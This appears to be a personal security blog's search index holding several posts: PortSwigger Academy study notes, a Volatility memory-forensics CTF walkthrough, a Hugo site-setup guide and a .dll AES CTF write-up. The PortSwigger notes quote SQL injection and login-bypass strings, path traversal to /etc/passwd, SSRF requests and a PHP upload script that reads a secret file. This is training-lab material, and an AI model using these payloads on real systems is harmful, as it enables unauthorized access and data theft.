familiar with SQL injections. This type of vulnerability takes advantage of a website using an SQL database where input isn\u0026rsquo;t filtered.\nIf there is an input form where the results are passed to an SQL query, there are times when you can put in an SQL command with some slight character manipulation, and it will pass the query as an actual SQL query.\nAccording to the course material, SQL injections can allow for DDoS attacks, which I was not aware of and find very interesting.\nDetect SQL Injection\rAccording to Portswigger, the following are methods that can be used to test for the potential of an SQL injection being possible:\nThe single quote character \u0026rsquo; and look for errors or other anomalies. Some SQL-specific syntax that evaluates the base (original) value of the entry point, and to a different value, and looks for systematic differences in the application responses. Boolean conditions such as OR 1=1 and OR 1=2 and look for differences in the application\u0026rsquo;s responses. Payloads designed to trigger time delays when executed within a SQL query and look for differences in the time taken to respond. OAST payloads are designed to trigger an out-of-band network interaction when executed within a SQL query and monitor any resulting interactions. Retrieving Hidden Data\rDoing some tests such as \u0026lsquo;+OR+1=1 at the end of a URL performing an SQL query can result in the dropping of an entire database, even hidden elements.\nPortswigger gives the following warning, which I think is important to remember:\nWarning\nTake care when injecting the condition OR 1=1 into an SQL query. Even if it appears to be harmless in the context you\u0026rsquo;re injecting into, it\u0026rsquo;s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.\nSQL Injection Lab\rThis one was straightforward. You just did the \u0026lsquo;+OR+1=1\u0026ndash; that was talked about earlier in the learning and it dropped all the products.\nSubverting Application Logic\rThis one is cool. You can try to subvert the SQL logic that is written out by inserting certain test characters into certain fields.\nFor example, if you wanted to log in as a user without needing to provide a password, and the SQL logic looked like SELECT * FROM users WHERE username = 'user' AND password = 'pass' if you just put in user'-- into the username field, it would allow you to bypass the password check.\nSubverting Application Logic Lab\rI got kind of confused here because I thought you had to leave the password field blank, but when you would do that the submission thing would freak out.\nWhat you had to do was input a password and then alter the username to have '-- at the end, which would then make the password field blank and not necessary to log in.\nThat\u0026rsquo;s all for day two! And that is the end of the Server-side Exploitation path. Next time, I\u0026rsquo;ll be moving onto the API testing pathway, where I\u0026rsquo;ll learn about how to exploit API.\nThank you all for reading, and I hope to continue providing my notes as I go along on these learning paths! They\u0026rsquo;ve been informative so far, and I feel like I am learning a lot.\n","date":"2024-04-26T00:00:00Z","image":"http://localhost:1313/blog/p/portswigger-academy-day-two/portswigger-02_hu13285292367581461777.jpg","permalink":"http://localhost:1313/blog/p/portswigger-academy-day-two/","title":"Portswigger Academy Day Two"},{"content":" Today I\u0026rsquo;m making my first entry in what I hope will be a series of posts on my daily learning at Portswigger Academy! Please let me know if you enjoyed this post, and without further ado, here are my notes for day one!\nPath Traversal\rStarting off I\u0026rsquo;m going down the server-side vulnerabilities path, which covers a variety of common server-side exploits.\nStarting off, they went over path traversal, which essentially is a vulnerability that allows you to access different areas of the server than you otherwise should be able to. The example that Portswigger Academy gives is there being a path traversal exploit within the image viewing.\nThis would look like url-here.com/file?image=image.jpg, where you can then put in something like url-here.com/file?image=../../../etc/passwd. The ../ is a valid file path, and you would put it there 3 times to traverse the path /var/www/site.\nAccess Control\rThere are many vulnerabilities that can be abused when it comes to access control.\nVertical Privilege Escalation\rHere, we looked at being able to traverse to other accounts using settings shown in the url, such as url.com/login?id=123 being able to be changed to a different ID number, or being able to find an exposed area of the website in something like the robots.txt file.\nUnpredictable URL\rThis is where they may obfuscate the url path of something, such as the admin panel, to prevent people being able to access them. However, often these obfuscated URLs are exposed within the HTML of the website or scripts running on the website.\nParameter-based Access Control\rThis one was interesting. Often, a cookie will be set to determine access rights. The thing about this is that cookies can be easily edited, which can allow the user to change their own privileges on the website.\nIn the example, they had us login to an authenticated account, which had an admin cookie set to false. You can easily use a cookie editor and change the admin setting in that cookie to \u0026ldquo;true\u0026rdquo;.\nHorizontal Privilege Escalation\rThis relates to traversing different accounts using things like user IDs, often GUIDs. Although sometimes these ID settings are in a predictable pattern, such as being set to the username of the user, often they are a random string of numbers and letters used to identify different accounts.\nUnpredictable ID\rThis is a similar idea to the unpredictable URL, where the ID is unpredictable. In the example lab, we had to go to the user account from their blog posts, which would leak the GUID in the URL, which can be input in the \u0026ldquo;My Account\u0026rdquo; panel, which will go to their account, where the password was exposed in the HTML.\nAuthentication Vulnerabilities\rThese are vulnerabilities where authentication can be easily bypassed. Authentication is the process of verifying that the user is who they claim to be, while the similar term, Authorization, is verifying that the user is allowed to do something. This would be related to user permissions like being an administrator account.\nBrute Force\rThis is where credentials are rapidly attempted on a login page. There are small indications in something like Burpsuite that the brute force attack has found something. Particularly with usernames, websites will often specify if the username or password is incorrect, which is a security flaw as this can indicate a user that exists on the website. You can tell the difference by the response size.\nWith passwords, once you find a username to test against, there will usually be a 302 status code returned, although paying attention to response time, response size, and possible other status codes that vary from the one consistently being returned is a good thing to do as well.\nBypassing Two-factor Authentication\rSometimes, even though two factor authentication is implemented, if a user has already authenticated with their password, sometimes other areas of the website that should be restricted to only be accessed when logged in are still accessible, even though the two-factor authentication wasn\u0026rsquo;t done.\nServer-side Request Forgery (SSRF)\rThese are attacks where the attacker may be able to get the server-side application to make requests to unintended locations. This would be like making the server connect to internal-only services, or making the server connect to an arbitrary external system, which could leak sensitive data.\nIn the lab, the requirement was to just request http://localhost/admin, however that wouldn\u0026rsquo;t delete the user you needed. You needed to find out what the URL was that deleted the user required, which was http://localhost/admin/delete?username=carlos, and put that in the stockApi request. It was much easier to do in burpsuite.\nAgainst Other Back-end Systems\rHere, instead of doing something like http://localhost/admin, you would replace localhost with an internal address such as 192.168.0.68. So, the request would look like stockApi=http://192.168.0.68/admin, which can give you access to the administrative panel of this internal system.\nThis one is a pain. You had to iterate through all the IPs in the 192.168.0.* range which takes forever on the community version of burpsuite. Ther\u0026rsquo;s probably a different way to do it faster outside of burpsuite, but anyway, once you find the one that pops the 200 status, you just find the URL for deleting carlos and boom you\u0026rsquo;ve got it.\nSame thing as last time essentially but you use the internal address you find.\nFile Upload Vulnerabilities\rThese types of vulnerabilities occur in file upload areas of a website. This is where a file upload doesn\u0026rsquo;t verify the filetype, which means you are able to upload code that may open shells within the system. The task in this lab is to upload a php script and gain access to the contents of a certain file. The php code I\u0026rsquo;m going to use is:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; autofocus id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php echo file_get_contents(\u0026#39;/home/carlos/secret\u0026#39;); ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; This shows the contents of that file, which is where the required flag is.\nExploiting Flawed File Upload Validation\rSometimes, even when a webpage tries to validate the file-type, it doesn\u0026rsquo;t do a very in-depth job of verifying. Because of this, you can use burpsuite to change the Content-Type header to match the MIME type that would allow your file. This is able to happen when the \u0026ldquo;header is implicitly trusted by the server\u0026rdquo; according to portswigger academy.\nThe lab here had you upload the same shell but intercept it using burpsuite. Once you intercepted it, you had to change the content type to image/jpeg, which would allow the file to be uploaded.\nThis is all of what I did on my first day going through this free course. If any of you want to try the course out, go to https://portswigger.net/web-security and register an account. There are a bunch of learning paths, so if you already feel versed in certain areas, you can go to others and try them out.\nI\u0026rsquo;m hoping to continue to update each day as I work on these. I\u0026rsquo;m going to use these posts to take notes, and then post them at the end of the day with all the content I\u0026rsquo;ve learned. Hopefully this entry piqued your interest, and you look into doing these courses yourself!\nIf you made it this far, I appreciate you reading. You can email me if you have anything you want to share, feel free to comment below! I\u0026rsquo;m hoping these note posts will keep me accountable with doing these pathways, and that it\u0026rsquo;ll be a good way to document my journey trying to get into web app exploitation!\n","date":"2024-04-24T00:00:00Z","image":"http://localhost:1313/blog/p/portswigger-academy-day-one/portswigger-01_hu3955479660669385389.png","permalink":"http://localhost:1313/blog/p/portswigger-academy-day-one/","title":"Portswigger Academy Day One"},{"content":"Today, I\u0026rsquo;m going to walk through how I solved Try Hack Me\u0026rsquo;s Forensics practice challenge. The task is to analyze a memory dump of a target system and find the malicious files. It largely focuses on identifying different IOC.\nTask 1\rGetting Started\rMy first instinct is to open up autopsy and pull the image into that program to analyze. Completely incorrect method. Well, not completely. I was able to see the hex dump of the image, but it was listing as two unallocated partitions that showed as deleted.\nMy next go-to is going to be using binwalk to extract the file system. I executed binwalk -e victim.raw to extract the data and other information. This seemed to be extracting something.\nThe first question was:\nWhat is the Operating System of this Dump file? (OS name)\nThis was pretty straight forward as the extracted files all were referencing the OS.\nDigging Deeper\rExtracting all those files via binwalk was unrealistic. I went back to Autopsy to see what options I had. Nothing still. It seemed to get stuck processing the image.\nAfter researching other ways to analyze a memory dump, I ran into someone mentioning Volatility, which I vaguely remembered was good for analyzing system dumps. I also hadn\u0026rsquo;t paid attention to the room having the Volatility logo on it which would\u0026rsquo;ve saved me some time.\nI hadn\u0026rsquo;t used it much up to this point, but I switched to a using Volatility. At first, I used Volatility Workbench.\nThis gave me the answer to the next question:\nWhat is the PID of SearchIndexer.\nIn Volatility Workbench, there is an option to view processes once you specify the memory dump. So, I dumped the memory processes, which gave me all the processes on the target system.\nFiles Upon Files\u0026hellip;\rIn the meantime, my Autopsy scan was still running away. I decided to check up on that as it seemed some more files were uncovered as the image was being analyzed.\nIt showed a bunch of carved files, and a potentially malicious zip file, but nothing of importance. The real helper here would be Volatility.\nThe next question and last question of the first task was\nWhat is the last directory accessed by the user.\nNow, I\u0026rsquo;ve never used Volatility that much, much less the GUI version, so it took some messing with. After digging around, I managed to figure out that selecting the windows.cmdline.CmdLine command and running that output some of the last commands executed.\nThat didn\u0026rsquo;t end up giving me what I needed. I decided to cave and just use Volatility in wsl. Volatility Workbench didn\u0026rsquo;t have everything on it I needed, plus it was based in Volatility 3 and I need Volatility 2 to run the shellbags plugin.\nThe shellbags plugin was supposed to give a list of accessed directories and their last access time, which would give me exactly what I needed.\nGetting Volatility working is always a pain, especially when it\u0026rsquo;s Volatility 2. But I got it installed and working, and ran vol.py -f victim.raw imageinfo to get the profile I should run.\nThen I ran vol.py -f victim.raw --profile=\u0026lt;profile\u0026gt; shellbags to hopefully get the last accessed directory. The profile given for me to run was Win7SP1x64 so I ran vol.py -f victim.raw --profile=Win7SP1x64 shellbags\nIt\u0026rsquo;s not sorted, obviously, so I did the same command but had it output to a text document. I was hoping to be able to put it into an excel spreadsheet. The command I did was vol.py -f victim.raw --profile=Win7SP1x64 shellbags \u0026gt; access.txt (This took forever to run).\nI decided to look through the output manually and just parse it out since there weren\u0026rsquo;t a whole lot, and I ended up finding the directory.\nTask 2\rNetscan\rNext question is about malicious services on different ports, so I\u0026rsquo;ll be running vol.py -f victim.raw --profile=Win7SP1x64 netscan to get the running services and their associated ports\nI was pretty confused at first because I could tell which service was the malicious one, I got the PID of it, 2464, and the service was wmpnetwk.exe as that\u0026rsquo;s not a typical service, but it\u0026rsquo;s listed a million different times.\nEventually, I found it listed at the beginning of the services list, so I put that in and I guess it was right. Not entirely sure how that\u0026rsquo;s more right than the others.\nMy assumption is that specific one is correct because it\u0026rsquo;s the primary instance that that service is running from.\nVad and Protection\rConfusion\rThe next question stumped me. It was asking to use Vad tags and execution protection to find IOCs (indicators of compromise), however I wasn\u0026rsquo;t sure how to go about doing that. I tried doing vadinfo, vadtree, and vaddump, and I just didn\u0026rsquo;t seem to be getting good information.\nI didn\u0026rsquo;t know what I was looking for at all was the issue. I didn\u0026rsquo;t know what certain vad tags or execution protection would indicate an issue.\nThis guide by eyehatmalwares was incredibly helpful. I realized looking through this single guide what was being asked of me.\nI still don\u0026rsquo;t entirely get what we are looking at with this stuff. I\u0026rsquo;m assuming it\u0026rsquo;s something to do with memory and ability to override what\u0026rsquo;s written in their processes or not, or what permission are allowed with that.\nI\u0026rsquo;m still not entirely sure what Virtual Address Descriptors (Vad) are, so that\u0026rsquo;ll have to go into the backlog of things to research. But I had learned enough to get what I needed.\nSolution\rMy plan was to parse out the nodes with PAGE_EXECUTE_READWRITE. Then I would see if that process contained a MZ or PE file, or if it had a JMP, RET, or CALL instruction.\nIn reality, with this problem, the malicious processes were the only ones that had PAGE_EXECUTE_READWRITE.\nFor some reason it the room wasn\u0026rsquo;t taking the PIDs in the order I was giving them. They had to be in a specific order to be considered correct.\nThe above method found the right PIDs, but the instructions implied a different method of solving, so I thought maybe I had gotten the wrong PIDs because I had used the wrong method, but that wasn\u0026rsquo;t the case.\nThe method that the challenge was implying wanted you to look for two things. If the node had a Protection: *_EXECUTE_* in it, plus the Vad Tag was VadS.\nThe method where you solely look for PAGE_EXECUTE_READWRITE works much better since only the services that were malicious had that specific protection.\nThere were a lot that had PAGE_EXECUTE_WRITECOPY but weren\u0026rsquo;t under a malicious service, so parsing through each and keeping an eye on if it had an associated VadS tag was kind of tedious. Parsing out the PAGE_EXECUTE_READWRITE was a much faster method.\nI\u0026rsquo;m assuming the required order had to do with the order the processes were listed as the order it required was the order in which the processes appeared on the report.\nI was thoroughly confused on what was being referred to with the vad s tag and execute protection, but I\u0026rsquo;m glad I learned about this. It\u0026rsquo;s good to learn different IOC, and I\u0026rsquo;m glad to know this one and have seen it in practice.\nTask 3\rWebsites\rNext, I\u0026rsquo;m going to use my Volatility Workstation that has all the processes listed that were running at the time of the memory dump to look and see what services these PID are associated with. Then, I\u0026rsquo;ll research these services on virus total to find the next question answers.\n(At least, that was my initial plan)\nIn the previous task, you identified malicious processes, so let\u0026rsquo;s dig into them and find some Indicator of Compromise (IOC). You just need to find them and fill in the blanks (You may search for them on VirusTotal to discover more details).\nThe first hint for the URL looks like this:\n\u0026lsquo;www.go****.ru\u0026rsquo; (write full URL without any quotation marks)\nWrong Direction\rSo, let\u0026rsquo;s go to virus total and do some digging. I am also doing a memdup of the specified PIDs since I think there are some questions about specifics within their memory. What I\u0026rsquo;m going to do is attempt to get a hash or something I can put into virus total and see what comes up.\nI am using WinDBG to analyze the 1860.dmp file. I\u0026rsquo;m also going to dump the 1820 and 2464 processes.\nI messed with these files for a while. I used a bunch of different tools said to be able to analyze .dmp files, but I defaulted back to volatility to see if I can dump all the files and maybe just pop them into virus total.\nIt took me way too long, but I found out that you can scan through the files and grep the service name file, and then download that specific file using the memory location.\nSo to get the memory location of the explorer.exe file, I ran vol.py -f victim.raw --profile=Win7SP1x64 filescan | grep explorer.exe and then I ran vol.py -f victim.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000005c5596e0 --name file -D 1860-memdump/\nRight Direction\rAfter dumping these process images and messing with them in IDA for a while, I decided to just try and parse through the strings. Sometimes things aren\u0026rsquo;t as complicated as we try to make them.\nSo, I went back to my terminal, and tried printing out the strings of each service and greping the question using wildcards.\nI was looking up how to properly grep with wild cards, and you actually have to do .* to mean any character since grep works with regular expressions.\nI used strings \u0026lt;service\u0026gt;.dmp | grep www.go.*.ru. I tried it on all the dump files and the only one that came up with any results was the service with PID of 1820.\nI did have to use a hint to figure out which one it might be as there were just way too many options. It seems like the hints just give you an idea as which site in the list of sites it might be. From that. I figured out which one was the correct URL.\nNext question is:\n\u0026lsquo;www.i****.com\u0026rsquo; (write full URL without any quotation marks)\nSo, I\u0026rsquo;m assuming that all the answers will be in the 1820 service, but if I couldn\u0026rsquo;t find them there I\u0026rsquo;d parse through the others as well. Next query looked like strings 1820.dmp | grep www.i.*.com.\nThe next hint wasn\u0026rsquo;t useful at all for me as I couldn\u0026rsquo;t tell which websites were related to the topic it gave me. There are also four characters after the \u0026lsquo;i\u0026rsquo; which helps us narrow it down a bit.\nI had to use the amount of characters to figure it out since there was only one result with four letters after the \u0026lsquo;i\u0026rsquo;, so I went with that one.\nNext:\n\u0026lsquo;www.ic******.com\u0026rsquo;\nWe already kind of got this one by doing the \u0026lsquo;i\u0026rsquo; wild card, but I\u0026rsquo;m going to rerun the query with the added \u0026lsquo;c\u0026rsquo; to narrow down the results so I don\u0026rsquo;t have to manually. In this one there should be six characters after the \u0026lsquo;ic\u0026rsquo;.\nThere was only one that fit that criteria, and it was the first result.\nIP Addresses\rNow we move onto finding the different IP addresses. Since I know how to properly use grep wildcards, this should be easy-peasy.\n202.***.233.*** (Write full IP)\nSo I did strings 1820.dmp | grep 202..*.233..* and only got one result back (thankfully).\n***.200.**.164 (Write full IP)\nAnd again we do strings 1820.dmp | grep .*.200..*.164 which gives us the flag and\u0026hellip; this mess\u0026hellip;\n\u0026hellip; Anyway, onto the next and final IP address query.\n209.190.***.***\nSo, one last time, we do strings 1820.dmp | grep 209.190..*..* which gives us this flag along with another weird URL.\nNow, the final question\u0026hellip;\nWhat is the unique environmental variable of PID 2464?\nI didn\u0026rsquo;t really know what a unique environmental variable was, so this was going to require some sleuthing.\nCome to find out, volatility has a plugin exactly for that. It\u0026rsquo;s called envars, and you just need to pop in the command like all other plugins with volatility.\nI used this command, vol.py -f victim.raw --profile=Win7SP1x64 -p 2464 envars --silent, to look up the environmental variable for the 2464 process.\nYou have to do --silent if you want the unique variable for that process.\nConclusion\rThat\u0026rsquo;s it! That\u0026rsquo;s how I went through solving the Try Hack Me Forensics Challenge! It was a lot of fun and I learned a lot along the way. If you have any questions about any steps I took during this process, leave them in the commends, or shoot me a message.\nI\u0026rsquo;m more than willing to answer questions when I can. If you made it this far, thank you for reading. I had a really fun time writing this up, and I\u0026rsquo;m really appreciative when people take the time to read what I put work into. So thank you!\n","date":"2024-04-18T00:00:00Z","image":"http://localhost:1313/blog/p/forensics-using-volatility/shellbags-output_hu2441692609693089482.png","permalink":"http://localhost:1313/blog/p/forensics-using-volatility/","title":"Forensics Using Volatility"},{"content":"This post is going to be about how I would go about setting up a website like mine now that I’ve done it. I’ve learned a lot, and ran into a lot of specific issues, and figured I could be helpful to others who run into these weird little issues too, as it was difficult to find information on them online.\nI’m not going to be going over the specifics of Hugo or really going into detail certain terms I am using. I would recommend getting a basic idea of how Hugo works by reading the Hugo documentation. This is always going to be a great reference to have.\nHugo\rStarting off, I decided to use the Hugo framework as opposed to Jekyll for a variety of reasons. The markdown support just feels better, and it’s actually a lot easier to get Github to run a Hugo website than it is to get it to run a Jekyll website even though Github advertises Jekyll primarily.\nI want to go over how a Hugo website even works regarding file systems, as it was difficult for me to get a grasp of initially. However, first I’m going to go over how to even get a website displaying on a local server with hugo, and then we’ll go over how to go about configuring things, as well as the function of the file system.\nInstall Hugo\rFirst, you’re going to want to install Hugo onto your system. You can do this easily on Windows by running winget install Hugo.Hugo.Extended in your terminal. This will automatically install Hugo.\nI’ve found this to be the best route, as winget is on every Windows 10 and 11 device by default, so it will typically just work. If you have a different host system, go here to get the appropriate instruction for your system.\nCreating First Site\rWhen you run hugo new site \u0026lt;sitename\u0026gt; -f “yaml” Hugo generates certain default files that are in a YAML format. For me, working with YAML instead of their default format is much more straight forward, and a lot of themes come by default with yaml configs.\nI’ve found many tutorials recommending running this command and then adding in the theme to the “themes” folder that’s generated, and then putting in the theme name into your config file that is generated. Although this works, there are a few more steps that could (and should) be taken.\nAdding Theme\rFirst, you want to go into your themes folder, and then do git clone \u0026lt;http clone link on repo\u0026gt;. This will generate a folder with the theme name, which you should at this point cd into.\nOnce there, I recommend removing the .git folder, as this will make your personal repo associate that folder with the theme’s repo rather than what is in the theme’s folders.\nSo if you try to configure the theme, and the .git folder is still in there, it won’t change anything. This is largely in relation to the css of the site.\nLots of theme tutorials recommend adding in alterations into the provided root folders, however this doesn’t always work with every theme, and just integrating the theme’s folders into your website directly instead of attempting to configure them separately just tended to work more often for me.\nTo do this you need to remove the .git folder in the theme’s directory.\nI would also recommend taking the files in their demo site, which is usually provided in a folder in the cloned repo, and copying them all over to your root directory, replacing the default ones generated by the hugo new site command. This will give you a base to mess with, with a proper configuration file that you can just change as you need.\nFolder Layout\rNow you should be able to run hugo serve or hugo server and get a display of the website on localhost:1313. This should be the example site being displayed in your browser. From here, let’s look at the folders and how they’re laid out. First, you’ll have your content folder. This is the most important folder, and one of the ones that confused me the most.\nThis is an example of what your content page might look like. Each folder is a type of content on your website. You can make exclusive respects of their front matter and put that markdown file into your archetypes folder. If an archetypes folder wasn’t generated by default, you can take the one from the theme and copy it into your root directory.\nHere’s an example of what my page.md archetype looks like:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 --- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; description: \u0026#34;\u0026#34; date: {{ .Date }} lastmod: {{ .Date }} aliases: - about-us - about-hugo - contact license: CC BY-NC-ND menu: main: weight: -90 params: icon: user comments: false --- And my post.md archetype file looks like this:\n1 2 3 4 5 6 7 8 9 10 11 --- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; description: \u0026#34;\u0026#34; date: {{ .Date }} lastmod: {{ .Date }} categories: tags: license: CC BY-NC-ND comments: false image: \u0026#39;\u0026#39; --- Then, when you want to make a new post, you would do hugo new content post/title.md or for a new page you would do hugo new content page/title.md.\nThis will generate a markdown file with the archetype skeleton you created already set up. From there, you can write a post or make a new page.\nI’m not going into specifics of configuring your site as that is dependent entirely on the theme you are working with, however I will provide some points that are important to know when configuring your website.\nThe Config File\rAll website config files will generally work the same with Hugo, so these settings can be present in basically any Hugo site and still will work in some way.\nSome points, there will always be certain configurations that should be set. Firstly is the introductory information:\n1 2 3 4 5 6 baseurl: / languageCode: en-us theme: \u0026lt;theme\u0026gt; paginate: 3 title: Website copyright: user This will set the title, theme, language, and copyright information for your website. The following will be parameters that are included in almost all themes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 params: defaultTheme: auto description: \u0026#34;\u0026#34; author: images: - cover.png favicon: apple-touch-icon.png logo: icon: DateFormat: \u0026#34;2006-01-02\u0026#34; mainSections: - posts - notes There’s a lot that could be covered with the configuration file, and a lot of the settings largely depend on the theme, but these are just some examples.\nOne article that helped me greatly with examples was from Kyrie who’s website and specific configuration examples you can find by clicking their name.\nA lot of these instructions are done with the papermod theme in mind, but I utilized a different theme for my blog and noticed that a lot of the configuration can be applied to both sites. There are just some settings in some themes that aren’t in others or vise-versa.\nGoogle Analytics and Disqus Comments\rThese last two points were something that I found difficult to figure out that I wanted to share my method for.\nGoogle Analytics allows you to keep track of the traffic coming to your website, and Disqus comments are a really simple way to include comments on your website, which many themes come able to support by default.\nFirstly, Google Analytics was a pain to figure out, but Hugo comes prepackaged by default with a google_analytics.html file that easily allows you to bring analytics into any site. First, in the config file, you want to do the following:\n1 2 3 4 services: # GA Tracking ID googleAnalytics: id: This will give you a way to input your tracking tag or GTag. However, you need to go into the theme’s files and find the head.html file in your layouts, which is usually in the partials folder.\nOnce in there, you can just add {{- template \u0026quot;_internal/google_analytics.html\u0026quot; . }} anywhere in that file and it will enable the ability to track analytics. Some themes come with this already included, others try but make it difficult to enable, so just make sure it’s by itself listed in the head.html file and you should be good.\nWith Disqus comments, most themes come with them already able to be included. You should see a section in your configuration file that looks like this:\n1 2 3 commentSystems: disqus: shortname: When you make an account with Disqus, you should be able to find your shortname in the general tab of the comment admin panel. You will just copy and past that into where it says “shortname”.\nWith some comment systems, you need to implement the Disqus API. This is a little more involved, but not too difficult. You will need to create an API application here.\nFrom there, you should get all the information needed. This is what the configuration section may look like:\n1 2 3 4 5 6 7 8 9 10 comments: enabled: true provider: disqus disqusjs: shortname: apiUrl: apiKey: admin: adminLabel: In the api application, once you’ve filled it out, you should get a settings page. From there, you should see the OAuth section:\nYou will want to grab the API Key and put that where it says apiKey in the configuration. Then, grab the authorization URL, and put that where it says apiUrl. Of course, you should already have your shortname.\nTo get your admin name and label, you can go to your profile and look over to where it says your name.\nWhere it says “admin” in your configuration file, you should put the @string where \u0026ldquo;string\u0026rdquo; is the string that is next to your @. The admin label should be your profile name.\nOnce all that is put into your configuration, if these steps are necessary, you should be able to have Disqus comments! Some themes don’t provide this functionality, although there are ways to add them in yourself.\nI recommend if you want to include Disqus comments, but don\u0026rsquo;t have it directly integrated, to follow the manual install guide the Disqus provides. You should just have to insert the function they give you into the layout html for your posts.\nConclusion\rI do hope this article answered a few questions you may have had in the process of setting up your Hugo website.\nIf requested, I can absolutely go more into depth on how to get a Hugo website set up from scratch. That will just take significantly longer to write.\nLet me know if that’s something you would like to see! Thank you for reading :)\n","date":"2024-04-17T00:00:00Z","image":"http://localhost:1313/blog/p/overview-of-hugo-site-setup/hugo-logo_hu1427607148780194274.png","permalink":"http://localhost:1313/blog/p/overview-of-hugo-site-setup/","title":"Overview of Hugo Site Setup"},{"content":"Intro\rSo, I need to be vaguer about this write-up, but I wanted to put out something regarding a recent competition I did. It was a lot of fun. How I did was significantly better than it had been. I went from getting 717th place to 244th place. So that means I met my goal this year!! Anyway, I\u0026rsquo;m going to do a quick write-up of one of their sections.\nThis section was under their \u0026ldquo;Enumeration and Exploitation\u0026rdquo; category. It was the medium challenge and was indeed quite the challenge. I want to write about this one because I had to write some Python scripts for it, which I found to be a lot of fun.\nMethodology\rThis one involved a .dll file that we had to find the flag within. The whole point was to try to \u0026ldquo;unlock\u0026rdquo; the program. Figure out how to view the code and get into the thing. This was a whole process not only to do but to figure out how to do it.\nHow?\rMy first thought was to try to run it, but I was worried about running a .dll on my device, for obvious reasons (still tried to though\u0026hellip; do not recommend it\u0026hellip; nothing happened it\u0026rsquo;s just a stupid idea). So, after going to other problems for a while, I came back to this one. After looking up \u0026ldquo;how to open .dll\u0026rdquo; and things like that, I eventually figured out that you needed to use a decompiler to look at the .dll code. So, I started looking up decompilers and eventually found a couple of opens. The main one I used was a JetBrains based decompiler called dotPeek.\nTaking Action\rOnce I got all that up and running, I opened the .dll in the decompiler and started digging around. This is what I saw:\nI then clicked the dropdown next to the crosslock app and one function immediately stuck out to me.\nSo, I opened it up, and, lo and behold, there was everything, although not exactly in the format I wanted. Firstly, this was an AES encrypted key, so I was provided with a key and an IV. On top of that, I was given the encrypted flag, however, it was\u0026hellip; well\u0026hellip; encrypted. So I had to do a little messing around\u0026hellip;\nThe Scripts\rFirst, the key, IV, and secret were given in bytes. So I had to figure out how to get bytes into human-readable text. I found this solution to that:\n1 2 \u0026gt;\u0026gt;\u0026gt;bytes = [\u0026lt;key\u0026gt;] \u0026gt;\u0026gt;\u0026gt;\u0026#34;\u0026#34;.join(map(chr, bytes)) Which outputs the key for me. It was pretty easy to notice without converting the IV, but the key and IV were the same. I could tell due to the bytes being the same. So I didn\u0026rsquo;t bother to go through the whole process with both. Once I had that, I needed to figure out how to get the encrypted flag.\nI stumbled around a while trying to figure out how to best output this stuff as putting it into the same script I had for the key just output a garbled mess. So, I made a guess and tried to make a script that outputs hex for me. This is what I came up with:\n1 2 \u0026gt;\u0026gt;\u0026gt;bytes = [\u0026lt;secret\u0026gt;] \u0026gt;\u0026gt;\u0026gt;\u0026#39;\u0026#39;.join(format(x, \u0026#39;02x\u0026#39;) for x in bytes) Finding The Flag\rThis gave me the flag in hex. The reason it was so garbled was that it was encrypted with AES, so I took the hex, went into Cyberchef and put in the AES Decrypt option (which that link should\u0026rsquo;ve led you to). From there, I put the hex in, input the key and IV, changed the format of the key and IV to UTF8, and baked! And that\u0026rsquo;s how I got the flag.\nIf you want to see more writeups from me, feel free to comment, or send me a message either of the ways I have available in my about. Let me know if you\u0026rsquo;d like more!\n","date":"2024-04-16T00:20:04-04:00","image":"http://localhost:1313/blog/p/crosslock/decompiler_hu15104536146372818611.png","permalink":"http://localhost:1313/blog/p/crosslock/","title":"Crosslock"},{"content":"First post\rThis is my first post! I\u0026rsquo;m excited for this new page because I finally seemed to manage to figure out a way to make a nice looking website. I was trying and trying forever to find something good, but could never seem to really find a good thing that stuck. If you want to learn about who I am, visit my about page. I\u0026rsquo;ll go into more detail on who I am and why I\u0026rsquo;m even making this thing.\nExpect a lot of writeups. I will probably make a seperate section for just random notes and stuff, but we will see if that happens.\n","date":"2024-04-15T17:44:04-04:00","image":"http://localhost:1313/blog/p/hello-world/9b5b6cd046b649410f79928cd3fc7295_hu5420340265333914057.jpg","permalink":"http://localhost:1313/blog/p/hello-world/","title":"Hello World"}]